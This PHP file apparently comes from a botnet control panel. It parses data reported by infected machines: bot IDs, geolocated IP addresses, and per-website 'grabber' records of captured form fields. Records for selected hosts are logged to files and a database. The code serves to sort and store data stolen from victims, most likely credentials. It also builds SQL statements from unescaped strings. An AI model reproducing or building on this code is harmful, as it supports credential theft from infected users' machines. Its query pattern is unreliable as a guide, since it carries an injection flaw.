<?php

preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $r->data, $match, PREG_SET_ORDER);

unset($r->data);

if(isset($match[0])){
	
	foreach($match as $item){
		if(!empty($item[1])){
			$matches = explode('0', $item[1], 2);
			if(!empty($matches[0]) && !empty($matches[1])){
				$prefix = strtoupper($matches[0]);
				$uid = '0' . strtoupper($matches[1]);
			}else{
				$prefix = 'UNKNOWN';
				$uid = '0UNKNOWN';
			}
			unset($matches);
		}else{
			$prefix = 'UNKNOWN';
			$uid = '0UNKNOWN';
		}

		if($geoip_ex != true){
			$country = geoip_country_code_by_name($item[2]);
		}else{
			if(file_exists($dir['site'] . '/cache/geoip/')) $country = geoip_country_code_by_addr($gi, $item[2]);
		}
		if(empty($country)) $country = 'UNK';

		preg_match_all('~#START#(.*)#NAME#(.*)#END#~isU', $item[3], $item[3], PREG_SET_ORDER);

		foreach($item[3] as $sitem){
			$sitem[2] = explode("\r\n", $sitem[2]);
			if(count($sitem[2]) > 0){
				foreach($sitem[2] as $line){
					if(!empty($line)){
						$ld = explode("@@@", $line);
						if(count($ld) > 1){
							$ld[0] = preg_replace('~ \((.*)\)~', '', $ld[0]);
							if(stripos($ld[0], 'http://') !== false){
								$port = @parse_url($ld[0], PHP_URL_PORT);
								$host = get_host($ld[0]);
							}elseif(stripos($ld[0], 'https://') !== false){
								$port = @parse_url($ld[0], PHP_URL_PORT);
								$host = get_host($ld[0]);
							}elseif(stripos($ld[0], 'site://') !== false){
								$ld[0] = str_replace('site://', 'http://', $ld[0]);
								$port = @parse_url($ld[0], PHP_URL_PORT);
								$host = get_host($ld[0]);
							}else{
								$port = @parse_url($ld[0], PHP_URL_PORT);
								$host = get_host('http://' . $ld[0]);
							}
							
							if(isset($filters[$host]) && $filters[$host]['save_log'] == '1'){
								$mysqli->query('INSERT DELAYED INTO bf_save_ilog (host, md5, type) VALUES (\''.$host.'\', \''.md5($host).'\', \''.$thread->type.'\')');
								file_put_contents($dir['s']['6'] . '/' . md5($host), '#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n", FILE_APPEND);
							}
							
							$count = count($ld);
							if($count == 2){
								$set_data = explode(':', $ld[1]);
							}elseif($count > 2){
								$set_data = array();
								for($i = 1; $i < count($ld); $i++){
									$s_data = explode(':', $ld[$i]);
									$set_data[$i-1] = $s_data[1];
								}
							}
							
							$count = count($filters[$host]['fields']['name']);
							if($count > 0){
								$add_sql = array();
								for($i = 1; $i <= $count; $i++){
									$set_data[$filters[$host]['fields']['grabber'][$i]-1] = rtrim($set_data[$filters[$host]['fields']['grabber'][$i]-1], '%#BOTEND#');
									if(!empty($set_data[$filters[$host]['fields']['grabber'][$i]-1])){
										$add_sql[$i] = $set_data[$filters[$host]['fields']['grabber'][$i]-1];
									}
								}
								
								if(count($add_sql) == $count){
									add_item($filters[$host]['id'], $prefix, $uid, $country, $sitem[1], $insert);
								}
							}
						}
					}
				}
			}
		}
	}
}

?>